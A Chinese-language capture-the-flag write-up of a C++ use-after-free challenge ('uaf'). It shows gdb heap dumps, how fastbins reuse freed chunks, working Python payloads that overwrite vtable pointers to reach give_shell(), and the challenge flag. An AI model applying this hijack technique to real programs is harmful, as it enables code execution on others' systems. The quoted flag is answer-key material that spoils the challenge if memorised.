### uaf

科普一个linux命令

`echo -en "\x66\x66\x66\x66" > test (<=="ffff")`

问题在于`Man,Woman`指针一直都在，而指向的内存 **部分可控**，并且有 **call内存** 的行为，考察的是fastbin的申请规则。

free后调用new，即可在原先位置上稍微带点限制地进行任意内容写。

先看一遍最正常的introduce的调用：
```
0x400fcd <main+265>: mov    rax,QWORD PTR [rbp-0x38] <---拿到Man的指针
0x400fd1 <main+269>: mov    rax,QWORD PTR [rax]  <---拿到Man中function所在的内存（可能叫虚表）
=> 0x400fd4 <main+272>: add    rax,0x8    <---拿到Man+8位置的东西（就是introduce()）
0x400fd8 <main+276>: mov    rdx,QWORD PTR [rax]
0x400fdb <main+279>: mov    rax,QWORD PTR [rbp-0x38]
0x400fdf <main+283>: mov    rdi,rax
0x400fe2 <main+286>: call   rdx      <----call Man->introduce()
```


到`0x400fd1`时
```
x $eax
0x204f040: 0x0000000000401570 <---Man虚函数所在的位置
```
更大的范围
```
gdb-peda$ x/20 $eax -0x40
0x1ee7000:      0x0000000000000000      0x0000000000000031
0x1ee7010:      0x0000000000000004      0x0000000000000004 <---Man的变量
0x1ee7020:      0x0000000000000000      0x000000006b63614a <---"Jack"
0x1ee7030:      0x0000000000000000      0x0000000000000021 <---Man的变量 end
0x1ee7040:      0x0000000000401570 <---Man的虚函数表      0x0000000000000019
0x1ee7050:      0x0000000001ee7028      0x0000000000000031
0x1ee7060:      0x0000000000000004      0x0000000000000004 <---Woman的变量
0x1ee7070:      0x0000000000000000      0x000000006c6c694a <---"Jill"
0x1ee7080:      0x0000000000000000      0x0000000000000021 <---Women的变量 end
0x1ee7090:      0x0000000000401550 <--Women的虚函数表     0x0000000000000015
```


到`0x400fd4`时
```
x/20 $rax-16
0x401560 <_ZTV3Man>:    0x0000000000000000      0x00000000004015d0 <--typeinfo
0x401570 <_ZTV3Man+16>: 0x000000000040117a <--give_shell()      0x00000000004012d2 <--introduce()
```

所以思路比较明确了，让Man+8的位置指向get_shell()而不是指向introduce()。

---------

先随便看看我们写入的东西在哪里吧

长度为 `24` 的时候
```
0x788040:       0x0000000000401570      0x0000000000000019
0x788050:       0x0000000000788028      0x0000000000000031
0x788060:       0x0000000000000004      0x0000000000000004
0x788070:       0x0000000000000000      0x000000006c6c694a
0x788080:       0x0000000000000000      0x0000000000000021
0x788090:       0x0000000000401550      0x0000000000000015
0x7880a0:       0x0000000000788078      0x0000000000020f61
0x7880b0:       0x0000000000000000      0x0000000000000000
0x7880c0:       0x0000000000000000      0x0000000000000000
0x7880d0:       0x0000000000000000      0x0000000000000000

0x788040:       0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0x788050:       0xaaaaaaaaaaaaaaaa      0x0000000000000031
0x788060:       0x0000000000788000(这个是指向下一个free的fastbin的指针，在这里没啥用)
                0x0000000000000004
0x788070:       0x00000000ffffffff      0x000000006c6c694a
0x788080:       0x0000000000000000      0x0000000000000021
    <---这里数据并没有改变，因为是0x30大小的东西，不会被填进去（文末会有填充规则）
0x788090:       0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0x7880a0:       0xaaaaaaaaaaaaaaaa      0x0000000000020f61（这个是指向堆顶的值）
0x7880b0:       0x0000000000000000      0x0000000000000000
0x7880c0:       0x0000000000000000      0x0000000000000000
0x7880d0:       0x0000000000000000      0x0000000000000000
```

所以，我们写入的前8个byte会被认为是get_shell的地址，然后call(addr(get_shell)+8)，将这8个byte改为addr(get_shell)-8就可以实现利用了。

于是我们写入`0x0000000000401568` + `0xaa*8` + `0xaa*8` 即可，当Man->introduce时候就会触发我们构造好的get_shell，之后输入 "3 2 1"，发现并没有成功，下面分析一下失败的原因。

在free过后，有几个可以填充的区域大概如下图
```
+---------+----------+-----------+------------+--------+
|junk 0x30| Man 0x20 | junk 0x30 | Woman 0x20 | so big |
+---------+----------+-----------+------------+--------+
```
经过debug，填充顺序是 Woman > Man > so big，所以我们321的话只写掉了Woman的数据，而call的时候是Man->introduce()再Woman->introduce()，前一句就会炸掉，所以利用不成功，之前还以为是 ~~Man>Woman>so big~~ 。

之后简单地改为 "3 2 2 1"即可拿到2次shell，分别是Man->introduce和Woman->introduce拿到的。当然，根据原理来看322222221也是可以的。

之后，我们来测试一下`junk 0x30`如何被利用，原理上是用 0x21~0x28的数据写的时候会申请0x30的空间，刚好可以覆盖的样子。
```x/40 $eax - 0x40
0x1c60000:      0x0000000000000000      0x0000000000000031
0x1c60010:      0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0x1c60020:      0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0x1c60030:      0xaaaaaaaaaaaaaaaa      0x0000000000000021
0x1c60040:      0x0000000000000000      0x0000000000000019
0x1c60050:      0x0000000001c60028      0x0000000000000031
0x1c60060:      0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0x1c60070:      0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0x1c60080:      0xaaaaaaaaaaaaaaaa      0x0000000000000021
0x1c60090:      0x0000000001c60030      0x0000000000000015
0x1c600a0:      0x0000000001c60078      0x0000000000020f61
0x1c600b0:      0x0000000000000000      0x0000000000000000
0x1c600c0:      0x0000000000000000      0x0000000000000000
0x1c600d0:      0x0000000000000000      0x0000000000000000
0x1c600e0:      0x0000000000000000      0x0000000000000000
0x1c600f0:      0x0000000000000000      0x0000000000000000
0x1c60100:      0x0000000000000000      0x0000000000000000
0x1c60110:      0x0000000000000000      0x0000000000000000
0x1c60120:      0x0000000000000000      0x0000000000000000
0x1c60130:      0x0000000000000000      0x0000000000000000
```

如图，我们覆盖成功了，同样，规则是优先覆盖右面的，然后覆盖左面的junk 0x30。


最后提供3种POC，利用的是 **Man->get_shell,Woman->get_shell,Humen->get_shell**

```
python -c "print '\x48\x15\x40\x00\x00\x00\x00\x00'+'\xaa'*90" > Woman
python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'+'\xaa'*90" > Man
python -c "print '\x88\x15\x40\x00\x00\x00\x00\x00'+'\xaa'*90" > Homan
./uaf 4~24均可 ./(Woman/Man/Human)均可
```

文末讨论一下 new char[len]是写在什么地方的。

1. fastbin最小的chunk是0x20个byte，其真正数据长度1<=len<=24；即new char[1]~new char[24]本质上是一样的
2. 文中Woman、Man的chunk大小是0x20，故free掉时候多出2个0x20的空间
3. 由于我们申请的是1~24，即0x20，所以会填入Woman和Man，顺序在于Man是先free掉的，Woman后free，故填充时优先填充Woman
4. 多次申请0x18的时候，整个流程为
  1. 看一眼woman，刚好，填充成功；
  2. 看一眼man，刚好，填充成功；
  3. 看一眼man之前的、之前的之前的，到头了，不成功，写入so big
  4. 同3
5. 多次申请0x28的时候，我们是为了填充文中的junk 0x30（虽然没什么卵用），顺序依然是从后到前，表现与4描述的一样
6. fastbin的原则（用来解释目前遇到过的现象）
  1. 单向链表存放
  2. 申请的时候，挨个比较`chunk`的大小，若刚好相同，则填入
  3. 若每个大小都不相同，则在`top`开一块内存


flag
`yay_f1ag_aft3r_pwning`
